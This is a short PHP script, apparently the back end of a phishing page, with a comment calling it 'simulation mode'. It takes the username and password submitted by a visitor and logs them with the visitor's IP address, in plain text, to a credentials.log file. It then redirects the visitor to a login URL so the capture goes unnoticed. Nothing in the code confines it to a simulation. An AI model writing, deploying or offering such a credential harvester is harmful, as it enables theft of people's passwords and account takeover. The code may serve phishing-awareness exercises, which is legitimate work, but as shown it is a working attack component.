<?php
// Capture credentials in simulation mode
$username = isset($_POST['username']) ? $_POST['username'] : '';
$password = isset($_POST['password']) ? $_POST['password'] : '';
$ip = $_SERVER['REMOTE_ADDR'];
$logfile = __DIR__ . '/../logs/credentials.log';

$log_entry = date('Y-m-d H:i:s') . " - IP: {$ip} - Username: {$username} - Password: {$password}\n";
file_put_contents($logfile, $log_entry, FILE_APPEND);

// Redirect to a safe destination
header("Location: https://example.com/login");
exit();
?>
